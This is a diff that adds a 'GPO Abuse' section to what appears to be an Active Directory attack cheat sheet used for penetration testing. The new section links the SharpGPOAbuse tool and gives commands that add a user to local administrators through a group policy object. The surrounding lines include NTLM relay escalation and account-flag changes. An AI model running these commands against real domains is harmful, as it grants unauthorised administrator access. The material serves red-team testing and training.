@@ -301,6 +301,16 @@ Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbos
 ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
 ```
 
+### GPO Abuse
+- https://github.com/FSecureLABS/SharpGPOAbuse
+
+#### Add local admin
+```
+./ShapGPOAbuse.exe --AddLocalAdmin --GPOName test --UserAccount Analyst1"
+gpupdate /force
+net localgroup administrators
+```
+
 ## MS Exchange
 - https://github.com/dafthack/MailSniper
 
